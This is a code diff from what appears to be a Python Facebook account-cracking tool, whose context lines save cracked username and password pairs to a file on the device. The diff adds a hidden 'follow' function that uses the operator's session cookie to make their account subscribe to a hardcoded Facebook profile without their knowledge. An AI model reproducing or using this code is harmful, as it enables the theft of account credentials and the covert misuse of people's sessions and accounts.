@@ -1012,6 +1012,19 @@ class crack:
             open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
             cp.append(user + pw)
 
+def follow(self,coki):
+        session = requests.Session()
+        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
+        for x in r.find_all("a",href=True):
+            if "/a/subscribe.php" in x.get('href'):
+                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
+        if '/a/subscribe.php' in str(r):
+            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
+            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
+        else:
+            pass
+
+
 
     def __pler_(self):
         os.system('clear')
